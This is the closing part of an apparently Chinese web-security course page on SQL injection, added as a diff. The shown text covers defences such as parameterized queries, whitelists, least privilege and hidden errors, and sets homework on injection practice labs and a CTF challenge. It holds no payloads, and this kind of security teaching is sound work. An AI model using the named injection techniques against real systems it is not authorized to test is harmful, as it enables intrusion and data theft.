+$stmt->execute(['username' => $username]);</code></pre>
+
+      <div class="note secret">
+        <span class="note-tag">MyBatis 里那个经典坑</span>
+        <p>
+          <code>#{}</code> 走预编译，安全；
+          <code>${}</code> 直接拼字符串，等于没防。
+        </p>
+        <p>
+          除了<strong>表名、列名、排序方向</strong>这种没法用参数绑定的地方（那些必须配白名单），
+          其他一律用 <code>#{}</code>。
+        </p>
+      </div>
+
+      <h4>第二层 · 输入校验与白名单</h4>
+
+      <p>
+        参数化解决的是"值"。但有些位置参数绑不进去 —— 表名、列名、排序方向。
+        那些地方只能靠白名单映射：
+      </p>
+
+      <pre><code>$sortMap = [
+    'name' =&gt; 'username',
+    'date' =&gt; 'created_at',
+];
+$key = $_GET['sort'] ?? 'name';
+$column = $sortMap[$key] ?? 'username';   // 不在表里就退回默认
+
+$sql = "SELECT id, username FROM users ORDER BY $column";</code></pre>
+
+      <p>
+        注意：拼进 SQL 的列名来自<strong>程序里写死的映射表</strong>，不是用户输入本身。
+      </p>
+
+      <div class="note pit">
+        <span class="note-tag">黑名单为什么不顶用</span>
+        <p>
+          删掉 <code>select</code>、删掉引号、删掉括号 —— 这种思路有三个致命问题：
+        </p>
+        <ul>
+          <li>永远列不全（上面那张表就是证据）</li>
+          <li>会误伤正常输入（用户名字里带个括号就炸了）</li>
+          <li>挡不住上下文差异（同一个字符在不同位置行为不同）</li>
+        </ul>
+      </div>
+
+      <h4>第三层 · 兜底</h4>
+
+      <ul>
+        <li><strong>最小权限</strong> —— 应用连数据库的账号，只给业务需要的权限。只读的接口就给 <code>select</code>，别给 <code>drop</code></li>
+        <li><strong>关掉详细错误</strong> —— 报错信息别返回给用户，写进日志</li>
+        <li><strong>WAF</strong> —— 能挡一部分批量扫描，但它是辅助，不能替代代码里的修复</li>
+        <li><strong>代码审查</strong> —— 搜索所有拼接 SQL 的地方，逐个改</li>
+      </ul>
+
+      <div class="note">
+        <span class="note-tag">如果让你去修一个已有系统</span>
+        <ol>
+          <li><strong>先止血</strong>：登录、查询这些核心功能，优先改成参数化</li>
+          <li><strong>再收敛</strong>：数据库账号降权，关掉详细报错</li>
+          <li><strong>后兜底</strong>：WAF 规则加上，但不能停在前两步就完事</li>
+        </ol>
+      </div>
+
+
+      <h2 id="s-homework">作业</h2>
+
+      <p>勾上就会记在本机，下次打开还在。</p>
+
+      <ul class="checkable">
+        <li>
+          <input type="checkbox" id="hw1" data-k="sql-lab">
+          <label for="hw1"><strong>打通我们的 SQL 靶场三关。</strong>
+          数字型联合查询、字符型万能密码、布尔盲注。
+          盲注那关要写脚本，别手工点。</label>
+        </li>
+        <li>
+          <input type="checkbox" id="hw2" data-k="sqli-lab">
+          <label for="hw2"><strong>装 sqli-lab，打完前 10 关。</strong>
+          PHP + MySQL 环境就能跑，装到 phpstudy 的 <code>www</code> 目录下即可。
+          前 10 关覆盖了数字型、字符型、报错、布尔、时间这几类，是标准练习场。</label>
+        </li>
+        <li>
+          <input type="checkbox" id="hw3" data-k="answer">
+          <label for="hw3"><strong>独立回答原文档末尾那 12 个问题。</strong>
+          不用写长，一两句话能说清就行。第 5、7、10 题是重点。</label>
+        </li>
+        <li>
+          <input type="checkbox" id="hw4" data-k="buu">
+          <label for="hw4"><strong>（选做）BUUCTF：[极客大挑战 2019] FinalSQL。</strong>
+          这道题要绕一点，做完把思路记下来。</label>
+        </li>
+      </ul>
+
+      <div class="note">
+        <span class="note-tag">下一讲会讲什么</span>
+        <p>
+          大概率是<strong>XSS</strong> 或者<strong>文件上传</strong>。
+          前者跟这一讲的思路一脉相承 —— 都是"把数据当代码执行"，
+          只不过一个在数据库里，一个在浏览器里。
+        </p>
+      </div>
+
+
+    </div>
+
+    <section class="teahouse" id="teahouse">
+      <div class="teahouse-head">
+        <h2>茶寮</h2>
+        <span class="sub">卡住的地方、踩过的坑，留个话，别人也看得到</span>
+      </div>
+      <div id="comments-mount"></div>
+    </section>
+
+  </article>
+
+  <aside class="side">
+    <div class="side-block">
+      <h4>本卷目录</h4>
+      <ul class="side-toc">
+        <li><a href="#s-intro">这一讲在讲什么</a></li>
+        <li><a href="#s-db">一 · 数据库解决什么</a></li>
+        <li><a href="#s-sql">二 · SQL 入门</a></li>
+        <li><a href="#s-why">三 · 注入怎么发生</a></li>
+        <li><a href="#s-find">四 · 找注入点</a></li>
+        <li><a href="#s-union">五 · 联合查询</a></li>
+        <li><a href="#s-error">六 · 报错注入</a></li>
+        <li><a href="#s-blind">七 · 盲注</a></li>
+        <li><a href="#s-special">八 · 特殊场景</a></li>
+        <li><a href="#s-defend">九 · 绕过与防御</a></li>
+        <li><a href="#s-homework">十 · 作业</a></li>
+      </ul>
+    </div>
+
+    <div class="side-block">
+      <h4>读了几成</h4>
+      <div class="progress-ring" data-progress-ring>
+        <svg width="42" height="42" viewBox="0 0 36 36" aria-hidden="true">
+          <circle class="ring-bg" cx="18" cy="18" r="15.5" fill="none" stroke-width="2"></circle>
+          <circle class="ring-fg" cx="18" cy="18" r="15.5" fill="none" stroke-width="2"
+                  stroke-linecap="round" transform="rotate(-90 18 18)"
+                  style="stroke-dasharray:97.39;stroke-dashoffset:97.39"></circle>
+        </svg>
+        <span class="num"><b data-progress-num>0/0</b>作业打了勾</span>
+      </div>
+    </div>
+  </aside>
+
+</main>
+
+<footer class="site-foot">
+  <p class="colophon">竹隐 &middot; 其三 &middot; 数据库与 SQL 注入</p>
+  <p class="colophon">所有实操请在自己机器或授权范围内进行。</p>
+</footer>
+
+<button class="to-top" type="button" aria-label="回到卷首">&uarr;</button>
+
+<script src="../assets/js/site-config.js"></script>
+<script src="../assets/js/comments.js"></script>
+<script src="../assets/js/site.js"></script>
+</body>
+</html>
